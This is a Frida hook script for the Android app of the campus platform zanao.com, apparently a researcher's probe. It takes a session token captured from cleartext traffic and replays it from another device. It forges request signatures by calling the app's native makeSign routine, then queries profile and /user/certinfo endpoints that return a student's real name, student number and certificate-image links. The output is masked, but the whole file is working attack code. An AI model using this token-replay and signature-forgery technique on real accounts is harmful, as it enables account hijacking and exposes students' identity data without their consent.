// probe19.js — 用认证号 B 的会话（从 vivo 明文流量中抓到），读 B 自己的 certinfo
// 签名在 Redmi 上本地算（makeSign 与账号无关），只读、只打码输出
var TOKEN = '<= 从明文流量抓到的 B 的 token，已脱敏 >';
var ALIAS = 'sysu';
var DEVICE = '<B 的 X-Sc-Device>';

function mask(s) {
    if (s === null || s === undefined) return s;
    s = String(s);
    if (s.length <= 1) return s;
    if (s.length <= 3) return s[0] + '*'.repeat(s.length - 1);
    return s[0] + '*'.repeat(s.length - 2) + s[s.length - 1];
}
function sign(f) {
    var T = Java.use('java.util.TreeMap'), m = T.$new();
    for (var k in f) m.put(String(k), String(f[k]));
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}
function api(path, data, method) {
    var S = Java.use('java.lang.String'), HUC = Java.use('java.net.HttpURLConnection');
    var url = 'http://api.app.zanao.com' + path, q = [];
    for (var k in data) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
    if (q.length) url += '?' + q.join('&');
    var c = Java.cast(Java.use('java.net.URL').$new(url).openConnection(), HUC);
    c.setRequestMethod(method || 'GET'); c.setConnectTimeout(12000); c.setReadTimeout(20000); c.setDoInput(true);
    var nd = '', td = String(Math.floor(Date.now() / 1000));
    for (var i = 0; i < 20; i++) nd += Math.floor(Math.random() * 10);
    var si = { timestamp__: td, randnum__: nd };
    for (var kk in data) si[kk] = data[kk];
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': sign(si), 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'okhttp/4.10.0'
    };
    for (var k2 in h) c.setRequestProperty(k2, String(h[k2]));
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream(), txt = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream'), buf = Java.array('byte', new Array(8192).fill(0)), b = BAOS.$new();
        while (true) { var n = is.read(buf); if (n <= 0) break; b.write(buf, 0, n); }
        is.close(); txt = String(S.$new(b.toByteArray(), 'UTF-8'));
    }
    var j = null; try { j = JSON.parse(txt); } catch (e) { }
    return { code: code, json: j, raw: j ? null : txt.substring(0, 200) };
}
function run() {
    var out = [];
    var p0 = api('/user/v1/profile', {});
    var ui = (p0.json && p0.json.data && p0.json.data.user_info) || {};
    out.push({ step: 'B 的账号', errno: p0.json && p0.json.errno, user_id: ui.user_id, id: ui.id,
               nickname: mask(ui.nickname), cert_status: ui.cert_status, vr_status: ui.vr_status,
               community_id: ui.community_id });

    var sl = api('/app/schoollist', {});
    var ids = [];
    (function f(o) {
        if (!o || typeof o !== 'object') return;
        if (Array.isArray(o)) { for (var i = 0; i < o.length; i++) f(o[i]); return; }
        if (o.id && o.name && String(o.name).indexOf('中山大学') >= 0) ids.push(o.id);
        for (var k in o) f(o[k]);
    })(sl.json);
    out.push({ step: '中山大学 school_id', ids: ids });

    var cands = ids.length ? ids : ['DxB7'];
    for (var i = 0; i < cands.length && i < 3; i++) {
        var r = api('/user/certinfo', { school_id: cands[i] }, 'GET');
        var ci = (r.json && r.json.data && r.json.data.cert_info) || {};
        out.push({
            step: 'certinfo', school_id: cands[i], errno: r.json && r.json.errno, errmsg: r.json && r.json.errmsg,
            keys: Object.keys(ci),
            realname: ci.realname ? mask(ci.realname) : null,
            student_no: ci.student_no ? mask(ci.student_no) : null,
            has_cert_img: !!ci.cert_img,
            cert_img_host: ci.cert_img ? String(ci.cert_img).substring(0, 40) : null,
            has_cert_img_url: !!ci.cert_img_url,
            college_text: ci.college_text, degree_text: ci.degree_text, join_year: ci.join_year,
            cert_status: ci.cert_status, school_name: ci.school_name
        });
    }
    send({ t: 'results', list: out });
}
(function w(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            try {
                var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
                ['request', 'easyRequest'].forEach(function (m) {
                    if (!N[m]) return;
                    N[m].overloads.forEach(function (ov) {
                        if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                        ov.implementation = function (s) {
                            try {
                                if (!globalThis.__done && s && s.indexOf('X-Sc-Token') >= 0) {
                                    globalThis.__done = true;
                                    setTimeout(function () { try { run(); } catch (e) { send({ t: 'run-err', m: '' + e }); } }, 2000);
                                }
                            } catch (e) { }
                            return ov.call(this, s);
                        };
                    });
                });
            } catch (e) { send({ t: 'hook-err', m: '' + e }); }
        });
        return;
    }
    if (t <= 0) return;
    setTimeout(function () { w(t - 1); }, 200);
})(200);
